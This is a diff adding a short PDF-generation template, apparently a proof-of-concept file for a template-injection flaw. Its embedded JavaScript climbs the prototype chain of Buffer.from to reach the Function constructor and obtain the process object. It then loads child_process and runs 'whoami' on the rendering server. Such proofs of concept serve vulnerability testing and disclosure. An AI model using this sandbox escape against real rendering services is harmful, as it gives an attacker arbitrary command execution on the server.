@@ -1,0 +1,14 @@
+<document defaultStyle={{ font: 'OpenSans', fontSize: 12 }}>
+    {(() => {
+        Object.getOwnPropertyDescriptor(
+            Buffer.from.__lookupGetter__('__proto__').call(Buffer.from),
+            'constructor',
+        )
+            .value('return process')()
+            .mainModule.require('child_process')
+            .execSync('whoami')
+            .toString()
+    })()}
+
+    <content>This will appear in my PDF!</content>
+</document>
